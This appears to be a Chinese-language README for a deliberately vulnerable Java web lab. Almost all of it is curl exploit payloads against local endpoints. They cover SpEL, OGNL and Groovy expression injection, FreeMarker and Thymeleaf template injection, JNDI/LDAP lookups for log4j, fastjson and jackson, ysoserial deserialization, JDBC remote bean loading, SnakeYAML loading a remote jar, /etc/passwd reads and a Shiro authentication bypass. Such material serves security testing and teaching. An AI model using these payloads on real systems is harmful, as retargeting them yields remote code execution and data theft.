### 脚本执行

#### ScriptEngineManager

```
curl 127.0.0.1:8080/script/javascript -d 'expression=java.lang.Runtime.getRuntime().exec("open /System/Applications/Calculator.app")'
```

#### EL

```
curl 127.0.0.1:8080/el/parse -d 'expression=Runtime.getRuntime().exec("open /System/Applications/Calculator.app")'
```

#### groovy

```
curl 127.0.0.1:8080/groovy/parse -d 'expression="open /System/Applications/Calculator.app".execute()'
```

#### ognl

```
curl 127.0.0.1:8080/ognl/parse -d 'expression=#a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{"open", "/System/Applications/Calculator.app/"})).start()'
```

#### spel

普通执行

```
curl 127.0.0.1:8080/spel/parse -d 'expression=T(java.lang.Runtime).getRuntime().exec("open /System/Applications/Calculator.app")'
```

读取输出: 用getErrorStream()读取stderr

```
curl 127.0.0.1:8080/spel/parse -d 'expression=new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("bash", "-c", "whoami").start().getInputStream(), "utf8")).readLine()'
```

class加载

```
curl 127.0.0.1:8080/spel/parse -d 'expression=T(org.springframework.cglib.core.ReflectUtils).defineClass("Foo",T(org.springframework.util.Base64Utils).decodeFromString("XXX"),new+javax.management.loading.MLet(new+java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()'
```

RMI

```
curl 127.0.0.1:8080/spel/parse -d 'expression=new+javax.management.remote.rmi.RMIConnector(new javax.management.remote.JMXServiceURL("service:jmx:rmi://127.0.0.1:1389/jndi/ldap://127.0.0.1:1389/Basic/Command/Calc"),new java.util.Hashtable()).connect()'

curl 127.0.0.1:8080/spel/parse -d 'expression=T(java.lang.System).setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true") %2B new javax.management.remote.rmi.RMIConnector(new javax.management.remote.JMXServiceURL("service:jmx:rmi://127.0.0.1:1389/jndi/ldap://127.0.0.1:1389/Basic/Command/Calc"), new java.util.Hashtable()).connect()'
```

#### mvel

```
curl 127.0.0.1:8080/mvel/parse -d 'expression=Runtime.getRuntime().exec("open /System/Applications/Calculator.app")'
```

### 反序列化

### JDBC

socket factory

```
curl 127.0.0.1:8080/drivermanager/connect -d 'url=jdbc:postgresql://localhost:5432/testdb?socketFactory%3dorg.springframework.context.support.ClassPathXmlApplicationContext%26socketFactoryArg=http://127.0.0.1:8000/bean-exec.xml'
```

ssl factory

```
echo S | ncat -l -vv -p 5432

curl 127.0.0.1:8080/drivermanager/connect -d 'url=jdbc:postgresql://localhost:5432/testdb?sslfactory%3dorg.springframework.context.support.FileSystemXmlApplicationContext%26sslfactoryarg=http://127.0.0.1:8000/bean-exec.xml'
```

#### readObject()

```
ysoserial CommonsCollections6 "open /System/Applications/Calculator.app" > test
curl 127.0.0.1:8080/object/parse --data-binary @test -H 'Content-Type: text/plain'
rm -f test
```

#### fastjson

```   
curl 127.0.0.1:8080/fastjson/parse -d 'json={"@type":"org.apache.commons.proxy.provider.remoting.RmiProvider","host":"127.0.0.1",port:"1099","name":"Exploit"}'

curl 127.0.0.1:8080/fastjson/parse -d 'json={"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true}'
```

#### jackson

```
curl 127.0.0.1:8080/jackson/parse -d 'json=["com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://127.0.0.1:1389/Exploit"}]'
```

#### xstream

```
curl 127.0.0.1:8080/xstream/parse -H 'Content-Type: text/xml' -d @test.xml
```

#### xmldecoder

```
curl 127.0.0.1:8080/xmldecoder/parse -H 'Content-Type: text/xml' -d @test.xml
```

#### jodd-json

```
curl 127.0.0.1:8080/jodd/parse -d 'type=com.mchange.v2.c3p0.JndiRefForwardingDataSource&json={"jndiName":"ldap://127.0.0.1:1389/Exploit","loginTimeout":0}'
```

### 模板渲染

#### velocity

```
curl 127.0.0.1:8080/velocity/eval -d 'username=#set($exp%3d"");$exp.getClass().forName("java.lang.Runtime").getRuntime().exec("open /System/Applications/Calculator.app")'
```

#### freemarker

JythonRuntime需要本地有class: https://tttang.com/archive/1412/

```
curl 127.0.0.1:8080/freemarker/unsafe -d 'template=<#assign value%3d"freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("open /System/Applications/Calculator.app")</@value>'

curl 127.0.0.1:8080/freemarker/unsafe -d 'template=<#assign value%3d"freemarker.template.utility.Execute"?new()>$${value("open /System/Applications/Calculator.app")}'

curl 127.0.0.1:8080/freemarker/unsafe -d 'template=${"freemarker.template.utility.Execute"?new()("open /System/Applications/Calculator.app")}'
```

eval模式

```
curl 127.0.0.1:8080/freemarker/eval -d 'username="freemarker.template.utility.Execute"?new()("open /System/Applications/Calculator.app")'
```

写文件

```
curl 127.0.0.1:8080/freemarker/eval -d 'username="freemarker.template.utility.ObjectConstructor"?new()("java.io.FileWriter","/tmp/test.txt").append("123").close()'
```

读文件

```
curl 127.0.0.1:8080/freemarker/unsafe -d 'template=<#assign+value="freemarker.template.utility.ObjectConstructor"?new()("java.io.FileReader", "/etc/passwd")>${"freemarker.template.utility.ObjectConstructor"?new()("java.util.Scanner", value).next()}'
```

执行SPEL

```
curl 127.0.0.1:8080/freemarker/unsafe -d 'template=${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("T(java.lang.Runtime).getRuntime().exec(\"open /System/Applications/Calculator.app\")").getValue()}'
```

#### thymeleaf模板注入

https://github.com/veracode-research/spring-view-manipulation

```
curl 'http://127.0.0.1:8080/thymeleaf/path?lang=__%24%7BT(java.lang.Runtime).getRuntime().exec(%27%6F%70%65%6E%20%2F%53%79%73%74%65%6D%2F%41%70%70%6C%69%63%61%74%69%6F%6E%73%2F%43%61%6C%63%75%6C%61%74%6F%72%2E%61%70%70%27)%7D__::.xx'
```

### 其他漏洞

#### log4j漏洞

```
curl 127.0.0.1:8080/log4j -d 'log=${jndi:ldap://127.0.0.1:1389/a}'
```

#### rmi client

启动RMI服务器

```
ysoserial ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "open /System/Applications/Calculator.app"
```

执行客户端查询

```
curl 127.0.0.1:8080/registry/lookup -d 'ip=127.0.0.1&port=1099&name=MyService'
```

#### jndi lookup

```
curl 127.0.0.1:8080/jndi/lookup -d 'url=ldap://127.0.0.1:1389/a'
```

#### snake yaml

```
curl 127.0.0.1:8080/snakeyaml/parse -d 'yaml=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1/payload.jar"]]]]'
```

### 其他接口

1. 测试/actuator接口
2. 测试 alwaysUseFullPath 认证绕过漏洞: http://rui0.cn/archives/1643
   * 直接访问 /shiro/auth 会提示认证失败
   * 使用 /shiro/no-auth/%2e%2e/auth 可以绕过认证
